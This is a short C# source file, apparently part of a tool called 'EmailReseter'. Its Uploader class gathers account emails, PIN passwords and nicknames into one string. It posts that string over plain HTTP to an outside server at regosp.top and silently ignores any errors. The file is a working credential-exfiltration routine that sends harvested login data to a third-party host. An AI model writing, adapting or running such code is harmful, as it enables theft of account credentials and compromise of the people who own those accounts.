using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace EmailReseter
{
    public class Uploader
    {

        private static readonly HttpClient client = new HttpClient();
        async public static void MakePost(List<Account> accs)
        {
            string data = null;
            try
            {
                foreach (var acc in accs)
                {
                    data += $"{acc.Email}:{acc.PinPassword}:{acc.Nick}{Environment.NewLine}";
                }
                var values = new Dictionary<string, string>
            {
               { "data", data},

            };

                var content = new FormUrlEncodedContent(values);

                var response = await client.PostAsync("http://regosp.top/datapost", content);

                var responseString = await response.Content.ReadAsStringAsync();
                var s = 1;
            }
            catch
            {

            }


        }

    }
}
